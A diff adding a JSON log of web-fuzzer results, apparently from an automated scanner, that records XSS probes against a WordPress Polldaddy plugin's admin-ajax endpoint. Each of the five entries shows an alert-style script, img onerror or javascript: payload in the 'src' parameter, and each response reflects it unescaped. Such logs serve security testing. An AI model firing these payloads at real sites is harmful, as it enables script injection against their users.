@@ -1,0 +1,407 @@
+{
+  "WebFuzzXSSVulnCheck": [
+    {
+      "coverage_id": "1787260697-8d65db62-cee8-4fa8-ba27-3c3a452fc461",
+      "priority": 8,
+      "http_target": "http://web/wp-admin/admin-ajax.php",
+      "http_method": "POST",
+      "fixed_params": {
+        "headers": {},
+        "cookies": {},
+        "query_params": {
+          "action": "polls_add_answer"
+        },
+        "body_params": {
+          "popup": "$uzz"
+        }
+      },
+      "fuzz_params": {
+        "headers": {},
+        "cookies": {},
+        "query_params": {},
+        "body_params": {
+          "src": "fuYz<script>alert(0xdeadbeef)</script>",
+          "aa": "fuzz"
+        }
+      },
+      "fuzz_weights": {
+        "headers": 0.25,
+        "cookies": 0.25,
+        "query_params": 1,
+        "body_params": 1
+      },
+      "errors": null,
+      "exceptions": null,
+      "response_body": "\n<li>\n\t\t\t\t<table class=\"answer\">\n\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<th>\n\t\t\t\t\t\t\t\t<span class=\"handle\" title=\"click and drag to reorder\"><img src=\"fuYz<script>alert(0xdeadbeef)</script>img/icon-reorder.png\" alt=\"click and drag to reorder\" width=\"6\" height=\"9\" /></span>\n\t\t\t\t\t\t\t</th>\n\t\t\t\t\t\t\t<td class=\"answer-input\">\n\t\t\t\t\t\t\t\t<input type=\"text\" autocomplete=\"off\" placeholder=\"Enter an answer here\" value=\"\" tabindex=\"2\" size=\"30\" name=\"answer[new0]\" />\n\t\t\t\t\t\t\t</td><td class=\"answer-media-icons\">\n\t\t\t\t\t\t\t\t<ul class=\"answer-media\">\n\t\t\t\t\t\t\t\t\t<li class=\"media-preview\" style=\"width: 20px; height: 16px; padding-left: 5px;\"></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add an Image\" class=\"thickbox media image\" id=\"add_poll_image0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add an Image\" src=\"images/media-button-image.gif\"></a></a></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add Audio\" class=\"thickbox media video\" id=\"add_poll_video0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add Audio\" src=\"images/media-button-video.gif\"></a></a></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add Video\" class=\"thickbox media audio\" id=\"add_poll_audio0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add Video\" src=\"images/media-button-music.gif\"></a></li>\n\t\t\t\t\t\t\t\t\t<li><a href=\"#\" class=\"delete-answer delete\" title=\"delete this answer\"><img src=\"fuYz<script>alert(0xdeadbeef)</script>img/icon-clear-search.png\" width=\"16\" height=\"16\" /></a></li>\n\t\t\t\t\t\t\t\t</ul><input type=\"hidden\" value=\"\" id=\"hMC0\" name=\"media[0]\">\n\t\t\t\t\t\t\t\t\t<input type=\"hidden\" value=\"\" id=\"hMT0\" name=\"mediaType[0]\">\n\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\n\t\t\t\t</table>\n\n\t\t\t</li>",
+      "response.body.length": 1575,
+      "response.headers": {
+        "Date": "Thu, 20 Aug 2026 21:18:17 GMT",
+        "Server": "Apache/2.4.57 (Debian)",
+        "X-Powered-By": "PHP/8.2.10",
+        "X-Robots-Tag": "noindex",
+        "X-Content-Type-Options": "nosniff",
+        "Expires": "Wed, 11 Jan 1984 05:00:00 GMT",
+        "Cache-Control": "no-cache, must-revalidate, max-age=0",
+        "Referrer-Policy": "strict-origin-when-cross-origin",
+        "X-Frame-Options": "SAMEORIGIN",
+        "Vary": "Accept-Encoding",
+        "Content-Length": "1575",
+        "Content-Type": "text/html; charset=UTF-8"
+      },
+      "response.status.code": 200,
+      "response.time": 621.774,
+      "number_of_new_paths": 0,
+      "total_hit": 0,
+      "total_unhit": 0,
+      "hit_count": 0,
+      "new_lines": 0,
+      "parent": "1787260651-6cc2ed1b-3ae8-40d7-8caf-f82f73b16d99",
+      "paths": [
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-client.php::::1273_1289_1316_1332_1350_3",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-xml.php::::838",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy.php::::106_107_108_110_136_138_18_19_22_23_40_41_42_43_44_4693_4743_4744_4745_4746_4747_4749_4750_76_77_78_79_80_81_82_83_84_85_86_87_88_89_90_92",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-shortcode.php::::20_21_22_24_25_26_3_444_446_463_464_468_6",
+        "/var/www/html/wp-content/plugins/polldaddy/rating.php::::153_158_160_3",
+        "/var/www/html/wp-content/plugins/polldaddy/ajax.php::::10_100_101_102_106_107_116_117_12_124_125_127_129_13_14_15_16_18_3_62_64_65_66_68_69_71_72_74_75_77_82_85_88_9_99",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-org.php::::15_16_17_18_19_20_21_22_23_24_27_28_29_3_30_456_468_469_473_474_475_476_478_479_485_490_491_492_6_629_631_633_659_667_670_8",
+        "/var/www/html/wp-content/plugins/polldaddy/popups.php::::102_103_130_132_3"
+      ],
+      "new_paths": [],
+      "vulns": [
+        "WebFuzzXSSVulnCheck"
+      ],
+      "score": 8,
+      "is_interesting": false,
+      "fuzzer_id": "6",
+      "is_initial_candidate": false,
+      "mutated_param_type": "body_params",
+      "mutated_param_name": "src"
+    },
+    {
+      "coverage_id": "1787260720-e23b130e-0268-4b48-b460-3b669a09d384",
+      "priority": 8,
+      "http_target": "http://web/wp-admin/admin-ajax.php",
+      "http_method": "POST",
+      "fixed_params": {
+        "headers": {},
+        "cookies": {},
+        "query_params": {
+          "action": "polls_add_answer"
+        },
+        "body_params": {
+          "popup": "\u0005fuzz"
+        }
+      },
+      "fuzz_params": {
+        "headers": {},
+        "cookies": {},
+        "query_params": {},
+        "body_params": {
+          "src": "f<img src='x' onerror='alert(0xdeadbeef)'>uz3",
+          "aa": "fuzz"
+        }
+      },
+      "fuzz_weights": {
+        "headers": 0.25,
+        "cookies": 0.25,
+        "query_params": 1,
+        "body_params": 1
+      },
+      "errors": null,
+      "exceptions": null,
+      "response_body": "\n<li>\n\t\t\t\t<table class=\"answer\">\n\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<th>\n\t\t\t\t\t\t\t\t<span class=\"handle\" title=\"click and drag to reorder\"><img src=\"f<img src=\\'x\\' onerror=\\'alert(0xdeadbeef)\\'>uz3img/icon-reorder.png\" alt=\"click and drag to reorder\" width=\"6\" height=\"9\" /></span>\n\t\t\t\t\t\t\t</th>\n\t\t\t\t\t\t\t<td class=\"answer-input\">\n\t\t\t\t\t\t\t\t<input type=\"text\" autocomplete=\"off\" placeholder=\"Enter an answer here\" value=\"\" tabindex=\"2\" size=\"30\" name=\"answer[new0]\" />\n\t\t\t\t\t\t\t</td><td class=\"answer-media-icons\">\n\t\t\t\t\t\t\t\t<ul class=\"answer-media\">\n\t\t\t\t\t\t\t\t\t<li class=\"media-preview\" style=\"width: 20px; height: 16px; padding-left: 5px;\"></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add an Image\" class=\"thickbox media image\" id=\"add_poll_image0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add an Image\" src=\"images/media-button-image.gif\"></a></a></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add Audio\" class=\"thickbox media video\" id=\"add_poll_video0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add Audio\" src=\"images/media-button-video.gif\"></a></a></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add Video\" class=\"thickbox media audio\" id=\"add_poll_audio0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add Video\" src=\"images/media-button-music.gif\"></a></li>\n\t\t\t\t\t\t\t\t\t<li><a href=\"#\" class=\"delete-answer delete\" title=\"delete this answer\"><img src=\"f<img src=\\'x\\' onerror=\\'alert(0xdeadbeef)\\'>uz3img/icon-clear-search.png\" width=\"16\" height=\"16\" /></a></li>\n\t\t\t\t\t\t\t\t</ul><input type=\"hidden\" value=\"\" id=\"hMC0\" name=\"media[0]\">\n\t\t\t\t\t\t\t\t\t<input type=\"hidden\" value=\"\" id=\"hMT0\" name=\"mediaType[0]\">\n\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\n\t\t\t\t</table>\n\n\t\t\t</li>",
+      "response.body.length": 1597,
+      "response.headers": {
+        "Date": "Thu, 20 Aug 2026 21:18:40 GMT",
+        "Server": "Apache/2.4.57 (Debian)",
+        "X-Powered-By": "PHP/8.2.10",
+        "X-Robots-Tag": "noindex",
+        "X-Content-Type-Options": "nosniff",
+        "Expires": "Wed, 11 Jan 1984 05:00:00 GMT",
+        "Cache-Control": "no-cache, must-revalidate, max-age=0",
+        "Referrer-Policy": "strict-origin-when-cross-origin",
+        "X-Frame-Options": "SAMEORIGIN",
+        "Vary": "Accept-Encoding",
+        "Content-Length": "1597",
+        "Content-Type": "text/html; charset=UTF-8"
+      },
+      "response.status.code": 200,
+      "response.time": 584.468,
+      "number_of_new_paths": 0,
+      "total_hit": 0,
+      "total_unhit": 0,
+      "hit_count": 0,
+      "new_lines": 0,
+      "parent": "1787260681-42adf8b1-b638-433a-b2da-72a576c05691",
+      "paths": [
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-client.php::::1273_1289_1316_1332_1350_3",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-xml.php::::838",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy.php::::106_107_108_110_136_138_18_19_22_23_40_41_42_43_44_4693_4743_4744_4745_4746_4747_4749_4750_76_77_78_79_80_81_82_83_84_85_86_87_88_89_90_92",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-shortcode.php::::20_21_22_24_25_26_3_444_446_463_464_468_6",
+        "/var/www/html/wp-content/plugins/polldaddy/rating.php::::153_158_160_3",
+        "/var/www/html/wp-content/plugins/polldaddy/ajax.php::::10_100_101_102_106_107_116_117_12_124_125_127_129_13_14_15_16_18_3_62_64_65_66_68_69_71_72_74_75_77_82_85_88_9_99",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-org.php::::15_16_17_18_19_20_21_22_23_24_27_28_29_3_30_456_468_469_473_474_475_476_478_479_485_490_491_492_6_629_631_633_659_667_670_8",
+        "/var/www/html/wp-content/plugins/polldaddy/popups.php::::102_103_130_132_3"
+      ],
+      "new_paths": [],
+      "vulns": [
+        "WebFuzzXSSVulnCheck"
+      ],
+      "score": 8,
+      "is_interesting": false,
+      "fuzzer_id": "6",
+      "is_initial_candidate": false,
+      "mutated_param_type": "body_params",
+      "mutated_param_name": "src"
+    },
+    {
+      "coverage_id": "1787260733-1b03ee9f-a19b-4e65-9cdb-72339a4f72fe",
+      "priority": 8,
+      "http_target": "http://web/wp-admin/admin-ajax.php",
+      "http_method": "POST",
+      "fixed_params": {
+        "headers": {},
+        "cookies": {},
+        "query_params": {
+          "action": "polls_add_answer"
+        },
+        "body_params": {
+          "popup": "$uzz"
+        }
+      },
+      "fuzz_params": {
+        "headers": {},
+        "cookies": {},
+        "query_params": {},
+        "body_params": {
+          "src": "fuYz<img src='x' onerror='alert(0xdeadbeef)'>",
+          "aa": "fuzz"
+        }
+      },
+      "fuzz_weights": {
+        "headers": 0.25,
+        "cookies": 0.25,
+        "query_params": 1,
+        "body_params": 1
+      },
+      "errors": null,
+      "exceptions": null,
+      "response_body": "\n<li>\n\t\t\t\t<table class=\"answer\">\n\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<th>\n\t\t\t\t\t\t\t\t<span class=\"handle\" title=\"click and drag to reorder\"><img src=\"fuYz<img src=\\'x\\' onerror=\\'alert(0xdeadbeef)\\'>img/icon-reorder.png\" alt=\"click and drag to reorder\" width=\"6\" height=\"9\" /></span>\n\t\t\t\t\t\t\t</th>\n\t\t\t\t\t\t\t<td class=\"answer-input\">\n\t\t\t\t\t\t\t\t<input type=\"text\" autocomplete=\"off\" placeholder=\"Enter an answer here\" value=\"\" tabindex=\"2\" size=\"30\" name=\"answer[new0]\" />\n\t\t\t\t\t\t\t</td><td class=\"answer-media-icons\">\n\t\t\t\t\t\t\t\t<ul class=\"answer-media\">\n\t\t\t\t\t\t\t\t\t<li class=\"media-preview\" style=\"width: 20px; height: 16px; padding-left: 5px;\"></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add an Image\" class=\"thickbox media image\" id=\"add_poll_image0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add an Image\" src=\"images/media-button-image.gif\"></a></a></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add Audio\" class=\"thickbox media video\" id=\"add_poll_video0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add Audio\" src=\"images/media-button-video.gif\"></a></a></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add Video\" class=\"thickbox media audio\" id=\"add_poll_audio0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add Video\" src=\"images/media-button-music.gif\"></a></li>\n\t\t\t\t\t\t\t\t\t<li><a href=\"#\" class=\"delete-answer delete\" title=\"delete this answer\"><img src=\"fuYz<img src=\\'x\\' onerror=\\'alert(0xdeadbeef)\\'>img/icon-clear-search.png\" width=\"16\" height=\"16\" /></a></li>\n\t\t\t\t\t\t\t\t</ul><input type=\"hidden\" value=\"\" id=\"hMC0\" name=\"media[0]\">\n\t\t\t\t\t\t\t\t\t<input type=\"hidden\" value=\"\" id=\"hMT0\" name=\"mediaType[0]\">\n\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\n\t\t\t\t</table>\n\n\t\t\t</li>",
+      "response.body.length": 1597,
+      "response.headers": {
+        "Date": "Thu, 20 Aug 2026 21:18:53 GMT",
+        "Server": "Apache/2.4.57 (Debian)",
+        "X-Powered-By": "PHP/8.2.10",
+        "X-Robots-Tag": "noindex",
+        "X-Content-Type-Options": "nosniff",
+        "Expires": "Wed, 11 Jan 1984 05:00:00 GMT",
+        "Cache-Control": "no-cache, must-revalidate, max-age=0",
+        "Referrer-Policy": "strict-origin-when-cross-origin",
+        "X-Frame-Options": "SAMEORIGIN",
+        "Vary": "Accept-Encoding",
+        "Content-Length": "1597",
+        "Content-Type": "text/html; charset=UTF-8"
+      },
+      "response.status.code": 200,
+      "response.time": 313.294,
+      "number_of_new_paths": 0,
+      "total_hit": 0,
+      "total_unhit": 0,
+      "hit_count": 0,
+      "new_lines": 0,
+      "parent": "1787260651-6cc2ed1b-3ae8-40d7-8caf-f82f73b16d99",
+      "paths": [
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-client.php::::1273_1289_1316_1332_1350_3",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-xml.php::::838",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy.php::::106_107_108_110_136_138_18_19_22_23_40_41_42_43_44_4693_4743_4744_4745_4746_4747_4749_4750_76_77_78_79_80_81_82_83_84_85_86_87_88_89_90_92",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-shortcode.php::::20_21_22_24_25_26_3_444_446_463_464_468_6",
+        "/var/www/html/wp-content/plugins/polldaddy/rating.php::::153_158_160_3",
+        "/var/www/html/wp-content/plugins/polldaddy/ajax.php::::10_100_101_102_106_107_116_117_12_124_125_127_129_13_14_15_16_18_3_62_64_65_66_68_69_71_72_74_75_77_82_85_88_9_99",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-org.php::::15_16_17_18_19_20_21_22_23_24_27_28_29_3_30_456_468_469_473_474_475_476_478_479_485_490_491_492_6_629_631_633_659_667_670_8",
+        "/var/www/html/wp-content/plugins/polldaddy/popups.php::::102_103_130_132_3"
+      ],
+      "new_paths": [],
+      "vulns": [
+        "WebFuzzXSSVulnCheck"
+      ],
+      "score": 8,
+      "is_interesting": false,
+      "fuzzer_id": "6",
+      "is_initial_candidate": false,
+      "mutated_param_type": "body_params",
+      "mutated_param_name": "src"
+    },
+    {
+      "coverage_id": "1787260750-c5182b95-e747-4938-bd8e-0af52e7ffd8f",
+      "priority": 139,
+      "http_target": "http://web/wp-admin/admin-ajax.php",
+      "http_method": "POST",
+      "fixed_params": {
+        "headers": {},
+        "cookies": {},
+        "query_params": {
+          "action": "polls_add_answer"
+        },
+        "body_params": {
+          "popup": "\tfuzz"
+        }
+      },
+      "fuzz_params": {
+        "headers": {},
+        "cookies": {},
+        "query_params": {},
+        "body_params": {
+          "src": "fuzz<img src='x' onerror='alert(0xdeadbeef)'>",
+          "aa": "fuzz"
+        }
+      },
+      "fuzz_weights": {
+        "headers": 0.25,
+        "cookies": 0.25,
+        "query_params": 1,
+        "body_params": 1
+      },
+      "errors": null,
+      "exceptions": null,
+      "response_body": "\n<li>\n\t\t\t\t<table class=\"answer\">\n\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<th>\n\t\t\t\t\t\t\t\t<span class=\"handle\" title=\"click and drag to reorder\"><img src=\"fuzz<img src=\\'x\\' onerror=\\'alert(0xdeadbeef)\\'>img/icon-reorder.png\" alt=\"click and drag to reorder\" width=\"6\" height=\"9\" /></span>\n\t\t\t\t\t\t\t</th>\n\t\t\t\t\t\t\t<td class=\"answer-input\">\n\t\t\t\t\t\t\t\t<input type=\"text\" autocomplete=\"off\" placeholder=\"Enter an answer here\" value=\"\" tabindex=\"2\" size=\"30\" name=\"answer[new0]\" />\n\t\t\t\t\t\t\t</td><td class=\"answer-media-icons\">\n\t\t\t\t\t\t\t\t<ul class=\"answer-media\">\n\t\t\t\t\t\t\t\t\t<li class=\"media-preview\" style=\"width: 20px; height: 16px; padding-left: 5px;\"></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add an Image\" class=\"thickbox media image\" id=\"add_poll_image0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add an Image\" src=\"images/media-button-image.gif\"></a></a></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add Audio\" class=\"thickbox media video\" id=\"add_poll_video0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add Audio\" src=\"images/media-button-video.gif\"></a></a></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add Video\" class=\"thickbox media audio\" id=\"add_poll_audio0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add Video\" src=\"images/media-button-music.gif\"></a></li>\n\t\t\t\t\t\t\t\t\t<li><a href=\"#\" class=\"delete-answer delete\" title=\"delete this answer\"><img src=\"fuzz<img src=\\'x\\' onerror=\\'alert(0xdeadbeef)\\'>img/icon-clear-search.png\" width=\"16\" height=\"16\" /></a></li>\n\t\t\t\t\t\t\t\t</ul><input type=\"hidden\" value=\"\" id=\"hMC0\" name=\"media[0]\">\n\t\t\t\t\t\t\t\t\t<input type=\"hidden\" value=\"\" id=\"hMT0\" name=\"mediaType[0]\">\n\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\n\t\t\t\t</table>\n\n\t\t\t</li>",
+      "response.body.length": 1597,
+      "response.headers": {
+        "Date": "Thu, 20 Aug 2026 21:19:10 GMT",
+        "Server": "Apache/2.4.57 (Debian)",
+        "X-Powered-By": "PHP/8.2.10",
+        "X-Robots-Tag": "noindex",
+        "X-Content-Type-Options": "nosniff",
+        "Expires": "Wed, 11 Jan 1984 05:00:00 GMT",
+        "Cache-Control": "no-cache, must-revalidate, max-age=0",
+        "Referrer-Policy": "strict-origin-when-cross-origin",
+        "X-Frame-Options": "SAMEORIGIN",
+        "Vary": "Accept-Encoding",
+        "Content-Length": "1597",
+        "Content-Type": "text/html; charset=UTF-8"
+      },
+      "response.status.code": 200,
+      "response.time": 518.472,
+      "number_of_new_paths": 8,
+      "total_hit": 0,
+      "total_unhit": 0,
+      "hit_count": 0,
+      "new_lines": 0,
+      "parent": "1787260736-1d375f8b-a931-4605-b63f-ea80d8f917cf",
+      "paths": [
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-client.php::::1273_1289_1316_1332_1350_3",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-xml.php::::838",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy.php::::106_107_108_110_136_138_18_19_22_23_40_41_42_43_44_4693_4743_4744_4745_4746_4747_4749_4750_76_77_78_79_80_81_82_83_84_85_86_87_88_89_90_92",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-shortcode.php::::20_21_22_24_25_26_3_444_446_463_464_468_6",
+        "/var/www/html/wp-content/plugins/polldaddy/rating.php::::153_158_160_3",
+        "/var/www/html/wp-content/plugins/polldaddy/ajax.php::::10_100_101_102_106_107_116_117_12_124_125_127_129_13_14_15_16_18_3_62_64_65_66_68_69_71_72_74_75_77_82_85_88_9_99",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-org.php::::15_16_17_18_19_20_21_22_23_24_27_28_29_3_30_456_468_469_473_474_475_476_478_479_485_490_491_492_6_629_631_633_659_667_670_8",
+        "/var/www/html/wp-content/plugins/polldaddy/popups.php::::102_103_130_132_3"
+      ],
+      "new_paths": [
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-client.php::::1273_1289_1316_1332_1350_3",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-xml.php::::838",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy.php::::106_107_108_110_136_138_18_19_22_23_40_41_42_43_44_4693_4743_4744_4745_4746_4747_4749_4750_76_77_78_79_80_81_82_83_84_85_86_87_88_89_90_92",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-shortcode.php::::20_21_22_24_25_26_3_444_446_463_464_468_6",
+        "/var/www/html/wp-content/plugins/polldaddy/rating.php::::153_158_160_3",
+        "/var/www/html/wp-content/plugins/polldaddy/ajax.php::::10_100_101_102_106_107_116_117_12_124_125_127_129_13_14_15_16_18_3_62_64_65_66_68_69_71_72_74_75_77_82_85_88_9_99",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-org.php::::15_16_17_18_19_20_21_22_23_24_27_28_29_3_30_456_468_469_473_474_475_476_478_479_485_490_491_492_6_629_631_633_659_667_670_8",
+        "/var/www/html/wp-content/plugins/polldaddy/popups.php::::102_103_130_132_3"
+      ],
+      "vulns": [
+        "WebFuzzXSSVulnCheck"
+      ],
+      "score": 139,
+      "is_interesting": false,
+      "fuzzer_id": "6",
+      "is_initial_candidate": false,
+      "mutated_param_type": "body_params",
+      "mutated_param_name": "src"
+    },
+    {
+      "coverage_id": "1787260813-547634e1-66be-41e2-bea1-0188f392f3f2",
+      "priority": 139,
+      "http_target": "http://web/wp-admin/admin-ajax.php",
+      "http_method": "POST",
+      "fixed_params": {
+        "headers": {},
+        "cookies": {},
+        "query_params": {
+          "action": "polls_add_answer"
+        },
+        "body_params": {
+          "popup": "\tfuzz"
+        }
+      },
+      "fuzz_params": {
+        "headers": {},
+        "cookies": {},
+        "query_params": {},
+        "body_params": {
+          "src": "f<a href='javascript:alert(0xdeadbeef)'uzz",
+          "aa": "fuzz"
+        }
+      },
+      "fuzz_weights": {
+        "headers": 0.25,
+        "cookies": 0.25,
+        "query_params": 1,
+        "body_params": 1
+      },
+      "errors": null,
+      "exceptions": null,
+      "response_body": "\n<li>\n\t\t\t\t<table class=\"answer\">\n\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<th>\n\t\t\t\t\t\t\t\t<span class=\"handle\" title=\"click and drag to reorder\"><img src=\"f<a href=\\'javascript:alert(0xdeadbeef)\\'uzzimg/icon-reorder.png\" alt=\"click and drag to reorder\" width=\"6\" height=\"9\" /></span>\n\t\t\t\t\t\t\t</th>\n\t\t\t\t\t\t\t<td class=\"answer-input\">\n\t\t\t\t\t\t\t\t<input type=\"text\" autocomplete=\"off\" placeholder=\"Enter an answer here\" value=\"\" tabindex=\"2\" size=\"30\" name=\"answer[new0]\" />\n\t\t\t\t\t\t\t</td><td class=\"answer-media-icons\">\n\t\t\t\t\t\t\t\t<ul class=\"answer-media\">\n\t\t\t\t\t\t\t\t\t<li class=\"media-preview\" style=\"width: 20px; height: 16px; padding-left: 5px;\"></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add an Image\" class=\"thickbox media image\" id=\"add_poll_image0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add an Image\" src=\"images/media-button-image.gif\"></a></a></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add Audio\" class=\"thickbox media video\" id=\"add_poll_video0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add Audio\" src=\"images/media-button-video.gif\"></a></a></li>\n\t\t\t\t\t\t\t\t\t<li><a title=\"Add Video\" class=\"thickbox media audio\" id=\"add_poll_audio0\" href=\"#\"><img style=\"vertical-align:middle;\" alt=\"Add Video\" src=\"images/media-button-music.gif\"></a></li>\n\t\t\t\t\t\t\t\t\t<li><a href=\"#\" class=\"delete-answer delete\" title=\"delete this answer\"><img src=\"f<a href=\\'javascript:alert(0xdeadbeef)\\'uzzimg/icon-clear-search.png\" width=\"16\" height=\"16\" /></a></li>\n\t\t\t\t\t\t\t\t</ul><input type=\"hidden\" value=\"\" id=\"hMC0\" name=\"media[0]\">\n\t\t\t\t\t\t\t\t\t<input type=\"hidden\" value=\"\" id=\"hMT0\" name=\"mediaType[0]\">\n\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\n\t\t\t\t</table>\n\n\t\t\t</li>",
+      "response.body.length": 1587,
+      "response.headers": {
+        "Date": "Thu, 20 Aug 2026 21:20:13 GMT",
+        "Server": "Apache/2.4.57 (Debian)",
+        "X-Powered-By": "PHP/8.2.10",
+        "X-Robots-Tag": "noindex",
+        "X-Content-Type-Options": "nosniff",
+        "Expires": "Wed, 11 Jan 1984 05:00:00 GMT",
+        "Cache-Control": "no-cache, must-revalidate, max-age=0",
+        "Referrer-Policy": "strict-origin-when-cross-origin",
+        "X-Frame-Options": "SAMEORIGIN",
+        "Vary": "Accept-Encoding",
+        "Content-Length": "1587",
+        "Content-Type": "text/html; charset=UTF-8"
+      },
+      "response.status.code": 200,
+      "response.time": 515.249,
+      "number_of_new_paths": 8,
+      "total_hit": 0,
+      "total_unhit": 0,
+      "hit_count": 0,
+      "new_lines": 0,
+      "parent": "1787260736-1d375f8b-a931-4605-b63f-ea80d8f917cf",
+      "paths": [
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-client.php::::1273_1289_1316_1332_1350_3",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-xml.php::::838",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy.php::::106_107_108_110_136_138_18_19_22_23_40_41_42_43_44_4693_4743_4744_4745_4746_4747_4749_4750_76_77_78_79_80_81_82_83_84_85_86_87_88_89_90_92",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-shortcode.php::::20_21_22_24_25_26_3_444_446_463_464_468_6",
+        "/var/www/html/wp-content/plugins/polldaddy/rating.php::::153_158_160_3",
+        "/var/www/html/wp-content/plugins/polldaddy/ajax.php::::10_100_101_102_106_107_116_117_12_124_125_127_129_13_14_15_16_18_3_62_64_65_66_68_69_71_72_74_75_77_82_85_88_9_99",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-org.php::::15_16_17_18_19_20_21_22_23_24_27_28_29_3_30_456_468_469_473_474_475_476_478_479_485_490_491_492_6_629_631_633_659_667_670_8",
+        "/var/www/html/wp-content/plugins/polldaddy/popups.php::::102_103_130_132_3"
+      ],
+      "new_paths": [
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-client.php::::1273_1289_1316_1332_1350_3",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-xml.php::::838",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy.php::::106_107_108_110_136_138_18_19_22_23_40_41_42_43_44_4693_4743_4744_4745_4746_4747_4749_4750_76_77_78_79_80_81_82_83_84_85_86_87_88_89_90_92",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-shortcode.php::::20_21_22_24_25_26_3_444_446_463_464_468_6",
+        "/var/www/html/wp-content/plugins/polldaddy/rating.php::::153_158_160_3",
+        "/var/www/html/wp-content/plugins/polldaddy/ajax.php::::10_100_101_102_106_107_116_117_12_124_125_127_129_13_14_15_16_18_3_62_64_65_66_68_69_71_72_74_75_77_82_85_88_9_99",
+        "/var/www/html/wp-content/plugins/polldaddy/polldaddy-org.php::::15_16_17_18_19_20_21_22_23_24_27_28_29_3_30_456_468_469_473_474_475_476_478_479_485_490_491_492_6_629_631_633_659_667_670_8",
+        "/var/www/html/wp-content/plugins/polldaddy/popups.php::::102_103_130_132_3"
+      ],
+      "vulns": [
+        "WebFuzzXSSVulnCheck"
+      ],
+      "score": 139,
+      "is_interesting": false,
+      "fuzzer_id": "6",
+      "is_initial_candidate": false,
+      "mutated_param_type": "body_params",
+      "mutated_param_name": "src"
+    }
+  ]
+}
